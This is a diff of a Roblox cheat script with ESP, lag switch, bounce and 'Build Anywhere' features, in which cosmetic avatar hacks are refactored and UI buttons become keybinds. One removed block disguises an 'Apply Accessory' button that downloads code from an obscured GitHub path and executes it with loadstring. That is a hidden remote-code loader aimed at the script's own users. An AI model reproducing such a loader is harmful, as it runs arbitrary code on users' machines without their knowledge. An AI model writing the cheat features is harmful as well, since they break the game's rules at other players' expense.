@@ -2502,7 +2502,98 @@ function DFunctions.RestoreEmoteChanges()
     DFunctions.ChangeEmotes(DConfiguration.Visual.OriginalEmotes.Emote12, DConfiguration.Visual.ModifyEmotes.Emote12)
 end
 
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+DFunctions.KorbloxR = false
+DFunctions.KorbloxL = false
+DFunctions.Headless = false
+
+function DFunctions.ApplyKorblox(side, meshId)
+    local char = player.Character
+    if not char then return end
+    
+    local legName = (side == "Right") 
+        and (char:FindFirstChild("Right Leg") and "Right Leg" or "RightUpperLeg") 
+        or (char:FindFirstChild("Left Leg") and "Left Leg" or "LeftUpperLeg")
+        
+    local leg = char:FindFirstChild(legName)
+    if leg then
+        for _, child in ipairs(leg:GetChildren()) do
+            if child:IsA("SpecialMesh") then child:Destroy() end
+        end
+        leg.Color = Color3.fromRGB(50, 50, 50)
+        local mesh = Instance.new("SpecialMesh")
+        mesh.Name = "KorbloxMesh"
+        mesh.MeshType = Enum.MeshType.FileMesh
+        mesh.MeshId = meshId
+        mesh.Parent = leg
+    end
+end
+
+function DFunctions.ApplyHeadless()
+    local char = player.Character
+    local head = char and char:FindFirstChild("Head")
+    if head then
+        head.Transparency = 1
+        if head:FindFirstChild("face") then head.face:Destroy() end
+        
+        if not head:FindFirstChild("HeadlessMesh") then
+            local mesh = Instance.new("SpecialMesh")
+            mesh.Name = "HeadlessMesh"
+            mesh.MeshType = Enum.MeshType.FileMesh
+            mesh.MeshId = "rbxassetid://1095708"
+            mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
+            mesh.Parent = head
+        end
+    end
+end
+
+function DFunctions.RevertChanges()
+    local char = player.Character
+    if not char then return end
+    
+    local head = char:FindFirstChild("Head")
+    if head then
+        head.Transparency = 0
+        local mesh = head:FindFirstChild("HeadlessMesh")
+        if mesh then mesh:Destroy() end
+    end
+    
+    for _, legName in pairs({"Right Leg", "RightUpperLeg", "Left Leg", "LeftUpperLeg"}) do
+        local leg = char:FindFirstChild(legName)
+        if leg then
+            leg.Color = Color3.new(1, 1, 1)
+            local mesh = leg:FindFirstChild("KorbloxMesh")
+            if mesh then mesh:Destroy() end
+        end
+    end
+end
+
+function DFunctions.UpdateVisuals()
+    if DFunctions.KorbloxR then DFunctions.ApplyKorblox("Right", "rbxassetid://101851696") end
+    if DFunctions.KorbloxL then DFunctions.ApplyKorblox("Left", "rbxassetid://101851582") end
+    if DFunctions.Headless then DFunctions.ApplyHeadless() end
+    
+    if not DFunctions.KorbloxR and not DFunctions.KorbloxL and not DFunctions.Headless then
+        DFunctions.RevertChanges()
+    end
+end
+
+task.spawn(function()
+    while true do
+        DFunctions.UpdateVisuals()
+        task.wait(0.1)
+    end
+end)
+
+player.CharacterAdded:Connect(function(char)
+    char:WaitForChild("Humanoid")
+    DFunctions.RevertChanges()
+end)
+
 -- Main
+
 local GamePlayers = workspace:WaitForChild("Game"):WaitForChild("Players")
 
 Tabs.Main:AddSection("Billboard ESP")
@@ -3525,23 +3616,6 @@ local Toggle = Tabs.Misc:AddToggle("PlayerWalkspeed", {Title = "Walkspeed Toggle
     
 Tabs.Misc:AddSection("Utilities")
 
-local Toggle = Tabs.Misc:AddToggle("LagSwitch", {Title = "Lag Switch (Button)", Default = false})
-
-Toggle:OnChanged(function(State)
-    if State then
-        DFunctions.CreateButton("LagSwitchButton", "Start Lag", 0.15 + DConfiguration.Settings.GuiScale.LagSwitch, 0.1 + DConfiguration.Settings.GuiScale.LagSwitch, function(btn)
-           task.spawn(function() 
-	           DFunctions.StartLag(DConfiguration.Misc.Utilities.LagSwitch.MSDelay) 
-           end)
-           btn.Text = "..."
-           wait(0.1)
-           btn.Text = "Start Lag"
-       end)
-    else
-        DFunctions.DestroyButton("LagSwitchButton")
-    end
-end)
-
 local Keybind = Tabs.Misc:AddKeybind("LagSwitchKey", {
         Title = "Lag Switch Keybind",
         Mode = "Toggle", -- Always, Toggle, Hold
@@ -3553,24 +3627,7 @@ local Keybind = Tabs.Misc:AddKeybind("LagSwitchKey", {
           end)
      end,
     })
-    
-Tabs.Misc:AddInput("LagSwitchButtonSize", {
-    Title = "Lag Switch Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.LagSwitch),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.LagSwitch = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.LagSwitch = 0
-        end
-        
-        DFunctions.UpdateButton("LagSwitchButton", 0.15 + DConfiguration.Settings.GuiScale.LagSwitch, 0.1 + DConfiguration.Settings.GuiScale.LagSwitch)
-    end
-})
+   
     
  Tabs.Misc:AddInput("DelayMS", {
         Title = "Delay MS",
@@ -3668,56 +3725,30 @@ Tabs.Misc:AddParagraph({
         Content = ""
     })
 
-local ToggleSuper = Tabs.Misc:AddToggle("SuperBounce", {Title = "Super Bounce", Default = false})
-
-ToggleSuper:OnChanged(function(State)
-    if State then
-        DFunctions.CreateButton("SuperBounceButton", "Super Bounce", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, function(btn)
-           DFunctions.SuperBounce()
-           btn.Text = "..."
-           wait(0.1)
-           btn.Text = "Super Bounce"
-       end)
-    else
-        DFunctions.DestroyButton("SuperBounceButton")
-    end
-end)
-
-Tabs.Misc:AddInput("SuperBounceSize", {
-    Title = "Super Bounce Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.SuperBounce),
-    Placeholder = "0",
-    Numeric = true,
-    Finished = false,
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            local safeSize = math.clamp(num * 0.01, 0, 2)
-            DConfiguration.Settings.GuiScale.SuperBounce = safeSize
-        else
-            DConfiguration.Settings.GuiScale.SuperBounce = 0
+local KeybindSuper = Tabs.Misc:AddKeybind("SuperBounceKey", {
+    Title = "Super Bounce",
+    Mode = "Toggle", 
+    Default = "X", 
+    Callback = function(State)
+        if State then
+            task.spawn(function()
+                DFunctions.SuperBounce()
+            end)
         end
-        DFunctions.UpdateButton("SuperBounceButton", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce)
-    end
+    end,
 })
-
-local ToggleRegular = Tabs.Misc:AddToggle("BounceBtnShow", {
-    Title = "Bounce (Button)", 
-    Description = "",
-    Default = false
+local KeybindRegular = Tabs.Misc:AddKeybind("BounceKey", {
+    Title = "Bounce (Keybind)",
+    Mode = "Toggle", 
+    Default = "P", 
+    Callback = function(State)
+        if State then
+            task.spawn(function()
+                TriggerBounce()
+            end)
+        end
+    end,
 })
-
-ToggleRegular:OnChanged(function(S)
-    if S then
-        local sizeOffset = DConfiguration.Settings.GuiScale.BounceBot or 0
-        
-        DFunctions.CreateButton("BounceBtn", "Rebound", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
-            TriggerBounce()
-        end)
-    else
-        DFunctions.DestroyButton("BounceBtn")
-    end
-end)
 
 Tabs.Misc:AddInput("BouncePowerInput", {
     Title = "Bounce Power",
@@ -3735,28 +3766,6 @@ Tabs.Misc:AddInput("BouncePowerInput", {
     end
 })
 
-local currentSize = DConfiguration.Settings.GuiScale.BounceBot
-if not currentSize or tostring(currentSize) == "nil" or currentSize == "" then
-    DConfiguration.Settings.GuiScale.BounceBot = 0
-end
-
-Tabs.Misc:AddInput("BounceBtnSize", {
-    Title = "Bounce Size Button",
-    Default = tostring(DConfiguration.Settings.GuiScale.BounceBot),
-    Placeholder = "0",
-    Numeric = true,
-    Finished = false,
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            local safeSize = math.clamp(num * 0.01, 0, 2)
-            DConfiguration.Settings.GuiScale.BounceBot = safeSize
-        else
-            DConfiguration.Settings.GuiScale.BounceBot = 0
-        end
-        DFunctions.UpdateButton("BounceBtn", 0.15 + DConfiguration.Settings.GuiScale.BounceBot, 0.1 + DConfiguration.Settings.GuiScale.BounceBot)
-    end
-})
 
 Tabs.Misc:AddParagraph({
         Title = " ",
@@ -4897,66 +4906,6 @@ Tabs.Exploits:AddToggle("BuildAnywhere", {
     end
 })
 
-local FakeSection = Tabs.Exploits:AddSection("AccessoryChanger")
-
-Tabs.Exploits:AddInput("AssetID", {
-    Title = "Custom Accessory ID",
-    Default = "150381051",
-    Numeric = true,
-    Callback = function(Value)
-        _G.SavedID = tonumber(Value)
-    end
-})
-
-Tabs.Exploits:AddButton({
-    Title = "Apply Accessory",
-    Callback = function()
-        if _G.SavedID then
-            local success, code = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/.github/.gist")
-            if success then
-                local func = loadstring(code)
-                if func then
-                    func()
-                end
-            end
-        end
-    end
-})
-
-
-Tabs.Exploits:AddButton({
-    Title = "No Accessories",
-    Callback = function()
-        local char = game.Players.LocalPlayer.Character
-        if char then
-            for _, obj in ipairs(char:GetChildren()) do
-                if obj:IsA("Accessory") then
-                    obj:Destroy()
-                end
-            end
-        end
-    end
-})
-
-do 
-    Tabs.Exploits:AddToggle("RemoveAccs", {Title = "Remove Accessories", Default = false})
-
-    task.spawn(function()
-        while task.wait(0.2) do
-            if Fluent.Options.RemoveAccs.Value then
-                local lp = game:GetService("Players").LocalPlayer
-                if lp and lp.Character then
-                    for _, v in ipairs(lp.Character:GetChildren()) do
-                        if v:IsA("Accessory") then
-                            v:Destroy()
-                        end
-                    end
-                end
-            end
-        end
-    end)
-end
-
 local FakeSection = Tabs.Exploits:AddSection("Grenade")
 
 Tabs.Exploits:AddToggle("Revive Grenade Toggle", {
@@ -6019,123 +5968,32 @@ Tabs.Settings:AddToggle("FPSCounterToggle", {
 
 Tabs.Extension:AddSection("Character Extension")
 
-_G.KorbloxR_Enabled = false
-_G.KorbloxL_Enabled = false
-_G.Headless_Enabled = false
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-
-local function applyKorblox(side, meshId)
-    local char = player.Character
-    if not char then return end
-    
-    local legName = (side == "Right") and (char:FindFirstChild("Right Leg") and "Right Leg" or "RightUpperLeg") or "Left Leg"
-    local leg = char:FindFirstChild(legName)
-    
-    if leg then
-        for _, child in ipairs(leg:GetChildren()) do
-            if child:IsA("SpecialMesh") then child:Destroy() end
-        end
-        
-        leg.Color = Color3.fromRGB(50, 50, 50)
-        local mesh = Instance.new("SpecialMesh")
-        mesh.Name = "KorbloxMesh"
-        mesh.MeshType = Enum.MeshType.FileMesh
-        mesh.MeshId = meshId
-        mesh.Parent = leg
-    end
-end
-
-local function applyHeadless()
-    local char = player.Character
-    local head = char and char:FindFirstChild("Head")
-    if head then
-        head.Transparency = 1
-        if head:FindFirstChild("face") then head.face:Destroy() end
-        
-        local mesh = Instance.new("SpecialMesh")
-        mesh.Name = "HeadlessMesh"
-        mesh.MeshType = Enum.MeshType.FileMesh
-        mesh.MeshId = "rbxassetid://1095708"
-        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
-        mesh.Parent = head
-    end
-end
-
-local function revertChanges()
-    local char = player.Character
-    if not char then return end
-    
-   
-    local head = char:FindFirstChild("Head")
-    if head then
-        head.Transparency = 0
-        local mesh = head:FindFirstChild("HeadlessMesh")
-        if mesh then mesh:Destroy() end
-    end
-    
-    
-    for _, legName in pairs({"Right Leg", "RightUpperLeg", "Left Leg"}) do
-        local leg = char:FindFirstChild(legName)
-        if leg then
-            leg.Color = Color3.new(1, 1, 1)
-            local mesh = leg:FindFirstChild("KorbloxMesh")
-            if mesh then mesh:Destroy() end
-        end
-    end
-end
-
-player.CharacterAdded:Connect(function(char)
-    task.wait(1) 
-    if _G.KorbloxR_Enabled then applyKorblox("Right", "rbxassetid://101851696") end
-    if _G.KorbloxL_Enabled then applyKorblox("Left", "rbxassetid://101851582") end
-    if _G.Headless_Enabled then applyHeadless() end
-end)
-
 Tabs.Extension:AddToggle("KorbloxRToggle", {
     Title = "Korblox (Right)",
-    Description = "",
     Default = false,
     Callback = function(Value)
-        _G.KorbloxR_Enabled = Value
-        if Value then 
-            applyKorblox("Right", "rbxassetid://101851696") 
-        else 
-            revertChanges() 
-        end
+        DFunctions.KorbloxR = Value
+        DFunctions.UpdateVisuals()
     end
 })
 
 Tabs.Extension:AddToggle("KorbloxLToggle", {
     Title = "Korblox (Left)",
-    Description = "",
     Default = false,
     Callback = function(Value)
-        _G.KorbloxL_Enabled = Value
-        if Value then 
-            applyKorblox("Left", "rbxassetid://101851582") 
-        else 
-            revertChanges() 
-        end
+        DFunctions.KorbloxL = Value
+        DFunctions.UpdateVisuals()
     end
 })
 
 Tabs.Extension:AddToggle("HeadlessToggle", {
     Title = "Headless",
-    Description = "",
     Default = false,
     Callback = function(Value)
-        _G.Headless_Enabled = Value
-        if Value then 
-            applyHeadless() 
-        else 
-            revertChanges() 
-        end
+        DFunctions.Headless = Value
+        DFunctions.UpdateVisuals()
     end
 })
-
 
 _G.Players = game:GetService("Players")
 _G.LPlayer = _G.Players.LocalPlayer
@@ -6330,6 +6188,30 @@ Tabs.Extension:AddToggle("TogDoomsekkar", {
         _G.ApplySingleExt(132809431, "Doomsekkar_Acc", state) 
     end
 })
+
+Tabs.Extension:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+    
+do 
+    Tabs.Extension:AddToggle("RemoveAccs", {Title = "Remove Accessories", Default = false})
+
+    task.spawn(function()
+        while task.wait(0.2) do
+            if Fluent.Options.RemoveAccs.Value then
+                local lp = game:GetService("Players").LocalPlayer
+                if lp and lp.Character then
+                    for _, v in ipairs(lp.Character:GetChildren()) do
+                        if v:IsA("Accessory") then
+                            v:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
 
 Tabs.Extension:AddButton({
     Title = "AvatarChanger",
